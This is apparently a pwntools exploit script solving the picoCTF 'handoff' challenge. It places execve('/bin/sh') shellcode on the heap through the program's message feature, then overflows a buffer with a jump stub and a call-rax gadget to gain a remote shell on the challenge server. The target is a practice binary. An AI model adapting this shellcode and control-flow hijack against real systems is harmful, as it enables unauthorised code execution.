from pwn import *

# === Setup context and load binary ===
context.binary = binary = ELF('./handoff', checksec=False)
context.terminal = ['tmux', 'splitw', '-h']  # Used with GDB debugging
context.log_level = 'debug'  # Show detailed logs during exploit

# === Start process (local or remote) ===
REMOTE = True
HOST = 'shape-facility.picoctf.net'
PORT = 53475

if REMOTE:
    p = remote(HOST, PORT)
else:
    p = process('./handoff')

# === Program interaction helpers ===
def create_recv(name):
    p.sendline(b'1')
    p.sendline(name)

def send_message(idx, message):
    p.sendline(b'2')
    p.sendline(str(idx).encode())
    p.sendline(message)

# === First stage: jmp shellcode to pivot to heap shellcode ===
jmp_shellcode = asm('''
    nop
    nop
    nop
    nop
    nop
    sub rax, 0x200
    sub rax, 0xcc
    jmp rax
''')

# === Second stage: execve("/bin/sh", NULL, NULL) ===
shellcode = asm('''
    lea rdi, [rip + binsh]
    xor esi, esi
    xor edx, edx
    mov eax, 59
    syscall

    binsh:
    .string "/bin/sh"
''')

# === Gadget to trigger control flow ===
CALL_RAX = p64(0x401014)

# === Send shellcode into heap via message system ===
create_recv(b'a' * 8)
send_message(0, shellcode)

# === Trigger overflow with jmp shellcode + return address ===
p.sendline(b'3')
p.sendline(jmp_shellcode.ljust(20, b'a') + CALL_RAX)

# === Shell ===
p.recvrepeat(1)
p.interactive()
